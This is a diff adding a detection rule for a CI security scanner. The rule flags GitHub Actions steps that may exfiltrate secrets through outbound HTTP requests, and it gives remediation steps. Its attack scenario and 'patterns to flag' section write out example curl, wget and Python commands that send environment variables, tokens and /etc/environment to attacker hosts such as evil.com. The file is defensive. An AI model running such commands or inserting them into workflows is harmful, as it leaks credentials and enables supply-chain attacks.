@@ -1,0 +1,166 @@
+id: VXS-012
+name: "Secret Exfiltration via Outbound HTTP Request"
+severity: high
+description: >
+  A `run:` block contains an outbound HTTP request command (curl, wget, httpie, python
+  requests, node fetch, etc.) targeting a non-GitHub domain (i.e., not github.com,
+  api.github.com, or ghcr.io) in a job context that has access to secrets or publishing
+  capabilities. This pattern is a strong indicator of credential exfiltration -- the
+  primary objective of most GitHub Actions supply-chain attacks. Attackers who achieve
+  code execution in a CI runner (via expression injection, fork checkout, compromised
+  action, etc.) need a way to exfiltrate stolen secrets to infrastructure they control.
+  The most common method is an HTTP POST request to an attacker-owned domain carrying
+  environment variables, secret values, or tokens as the request body. While there are
+  legitimate uses of outbound HTTP requests in CI (API calls, webhook notifications,
+  deployment), the combination of external HTTP requests with secrets access in a
+  workflow triggered by untrusted events (pull_request_target, issue_comment, etc.)
+  is a high-confidence indicator of either active exploitation or a dangerous pattern
+  that could be exploited.
+
+tags:
+  - exfiltration
+  - supply-chain
+
+attack_scenario: >
+  An attacker has compromised a GitHub Actions workflow through one of several vectors:
+  expression injection (VXS-002), fork checkout (VXS-001), compromised third-party
+  action (VXS-007), or curl-pipe-bash (VXS-006). The attacker's payload executes in
+  the CI runner with access to GITHUB_TOKEN and any secrets configured on the repository.
+  The attacker runs: `curl -X POST https://hackmoltrepeat.com/collect -d "$(env | base64)"`.
+  This single command exfiltrates all environment variables -- which in GitHub Actions
+  include GITHUB_TOKEN, any secrets passed via env mappings, runner metadata, and
+  repository information -- to an attacker-controlled server. The attacker can also
+  target specific high-value secrets: `curl -s https://evil.com/exfil -d "token=$DEPLOY_TOKEN"`.
+  Once the attacker has the GITHUB_TOKEN or a Personal Access Token, they can: push
+  malicious commits to the repository, create backdoored releases, access private
+  repositories (if a PAT with repo scope was stolen), modify GitHub Actions workflows
+  to establish persistence, or pivot to cloud infrastructure if the token grants access
+  to cloud APIs. The exfiltration domain is typically a recently registered domain,
+  a cloud function endpoint, or a DNS-based exfiltration channel. The attacker may
+  also use legitimate-looking domains (e.g., github-security-scan.com) to avoid
+  detection.
+
+real_world_incident: >
+  In documented CI/CD compromises, attackers exploited `pull_request_target` workflows
+  to execute malicious code in CI runners. The payloads exfiltrated GitHub Personal
+  Access Tokens to attacker-controlled domains using curl POST requests. The attackers
+  then used the stolen PATs to authenticate to GitHub and push malicious commits
+  directly to the target repositories' main branches. These incidents demonstrated the
+  complete attack chain: vulnerability exploitation -> secret exfiltration -> supply-chain
+  compromise. The exfiltration was only detected after the malicious commits were
+  pushed, highlighting the importance of proactive detection of outbound HTTP requests
+  in CI pipelines. Similarly, in the tj-actions/changed-files incident, the compromised
+  action exfiltrated secrets by writing them to workflow logs and external endpoints.
+
+fix: |
+  **Restrict and audit outbound network access in CI workflows.**
+
+  **Step 1: Audit existing outbound HTTP requests in workflows.**
+
+  Search all workflow files for curl, wget, and other HTTP commands that target
+  external domains:
+
+  ```bash
+  # Find potential exfiltration patterns in workflow files
+  grep -rn 'curl\|wget\|http\|https' .github/workflows/ | \
+    grep -v 'github.com\|githubusercontent.com\|ghcr.io\|actions/'
+  ```
+
+  **Step 2: Use environment variables instead of inline URLs for legitimate requests.**
+
+  ```yaml
+  # AUDITABLE: Legitimate outbound requests use documented env vars
+  - name: Notify deployment
+    run: |
+      curl -X POST "${SLACK_WEBHOOK_URL}" \
+        -H "Content-Type: application/json" \
+        -d '{"text": "Deployment complete"}'
+    env:
+      SLACK_WEBHOOK_URL: ${{ secrets.SLACK_WEBHOOK }}
+  ```
+
+  **Step 3: Restrict network access using StepSecurity Harden-Runner.**
+
+  ```yaml
+  jobs:
+    build:
+      runs-on: ubuntu-latest
+      steps:
+        # Restrict outbound network to known endpoints
+        - uses: step-security/harden-runner@v2
+          with:
+            egress-policy: block
+            allowed-endpoints: >
+              github.com:443
+              api.github.com:443
+              registry.npmjs.org:443
+              ghcr.io:443
+
+        - uses: actions/checkout@v4
+        - run: npm ci && npm test
+  ```
+
+  **Step 4: Monitor and alert on unexpected outbound connections.**
+
+  ```yaml
+  - name: Audit network connections
+    run: |
+      # Log all DNS resolutions and outbound connections during build
+      # (Requires appropriate runner configuration)
+      echo "::group::Network audit"
+      cat /etc/resolv.conf
+      # Use harden-runner or similar tool for actual network monitoring
+      echo "::endgroup::"
+  ```
+
+  **Step 5: For workflows with secrets, limit the blast radius.**
+
+  ```yaml
+  jobs:
+    build:
+      runs-on: ubuntu-latest
+      permissions:
+        contents: read  # Minimal permissions
+      # Do NOT pass secrets to build steps that don't need them
+      steps:
+        - uses: actions/checkout@v4
+        - run: npm ci && npm test
+        # No secrets in env -- nothing to exfiltrate
+
+    publish:
+      needs: build
+      if: github.ref == 'refs/heads/main'
+      runs-on: ubuntu-latest
+      permissions:
+        packages: write
+      environment: production  # Requires approval
+      steps:
+        - uses: actions/checkout@v4
+        - run: npm publish
+          env:
+            NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}
+  ```
+
+  **Patterns to flag for review:**
+
+  ```bash
+  # HIGH-RISK: Exfiltration indicators
+  curl -X POST https://<non-github-domain> -d "$(env)"
+  curl https://evil.com -d "$GITHUB_TOKEN"
+  wget -q -O- https://external.com/collect?data=$(base64 /etc/environment)
+  python -c "import requests; requests.post('https://evil.com', data=open('/etc/environment').read())"
+
+  # MEDIUM-RISK: Outbound requests in secrets-enabled context
+  curl https://api.external-service.com/webhook
+  wget https://tools.example.com/install.sh
+  ```
+
+  **Key principles:**
+  - Use egress filtering (StepSecurity Harden-Runner) for all security-sensitive workflows
+  - Minimize secrets exposure -- only pass secrets to steps that need them
+  - Audit all outbound HTTP requests in workflow files
+  - Use GitHub's environment protection rules for deployment secrets
+  - Monitor workflow logs for unexpected outbound connections
+  - Treat any curl/wget to a non-allowlisted domain in a secrets-enabled context as suspicious
+
+references: []
